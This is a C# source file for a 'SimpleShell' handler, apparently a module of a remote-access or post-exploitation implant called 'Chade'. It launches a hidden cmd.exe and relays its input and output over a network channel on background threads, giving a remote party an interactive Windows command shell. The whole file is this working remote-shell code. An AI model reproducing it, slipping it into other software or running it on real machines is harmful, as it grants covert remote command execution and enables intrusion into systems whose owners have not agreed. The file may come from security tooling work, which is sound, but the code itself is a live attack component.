using Ephemeral.Chade.Communication;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Ephemeral.Chade.Logging;
using System.Threading;

namespace Ephemeral.Chade.Handlers
{
    public class SimpleShell
    {
        private IChannel _channel;

        private Process _process;
        private Thread _inputThread;
        private Thread _outputThread;
        private bool _abortThreads;

        public SimpleShell(IChannel channel)
        {
            this._channel = channel;
        }

        public void Process()
        {
            _process = new Process();
            _process.StartInfo.FileName = "cmd.exe";
            _process.StartInfo.UseShellExecute = false;
            _process.StartInfo.CreateNoWindow = true;
            _process.StartInfo.RedirectStandardOutput = true;
            _process.StartInfo.RedirectStandardError = true;
            _process.StartInfo.RedirectStandardInput = true;
            _process.Start();

            _inputThread = new Thread(ProcessChannelInput);
            _outputThread = new Thread(ProcessChannelOutput);

            _abortThreads = false;

            _inputThread.Start();
            _outputThread.Start();

            Logger.GetInstance().Debug("Started shell process and threads.");
        }

        public void WaitForProcessing()
        {
            _inputThread.Join();
            _outputThread.Join();
        }

        public void Abort()
        {
            _abortThreads = true;
            Logger.GetInstance().Debug("Aborting threads if still active.");
        }

        public void Dispose()
        {
            this.Abort();
            _process.Kill();
            _process.Close();
            Logger.GetInstance().Debug("Disposed SimpleShell handler.");
        }

        private void ProcessChannelInput()
        {
            Logger.GetInstance().Debug("Started process channel input thread.");
            while (_channel.IsConnected() && !this._abortThreads && !_process.HasExited)
            {
                try
                {
                    byte[] buffer = new byte[2048];
                    var bytesRead = _channel.Read(buffer, 0, buffer.Length);
                    var input = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    _process.StandardInput.Write(input);
                }
                catch (Exception e)
                {
                    Logger.GetInstance().Error($"Channel input thread exception: {e.Message}");
                }
            }
            Logger.GetInstance().Debug("Exited process channel input thread.");
        }

        private void ProcessChannelOutput()
        {
            Logger.GetInstance().Debug("Started process channel output thread.");
            while (_channel.IsConnected() && !this._abortThreads && !_process.HasExited)
            {
                try
                {
                    var output = _process.StandardOutput.ReadLine() + "\n";
                    var bytes = Encoding.UTF8.GetBytes(output);
                    _channel.Write(bytes, 0, bytes.Length);
                    _channel.Flush();
                }
                catch (Exception e)
                {
                    Logger.GetInstance().Error($"Channel output thread exception: {e.Message}");
                }
            }
            Logger.GetInstance().Debug("Exited process channel output thread.");
        }
    }
}
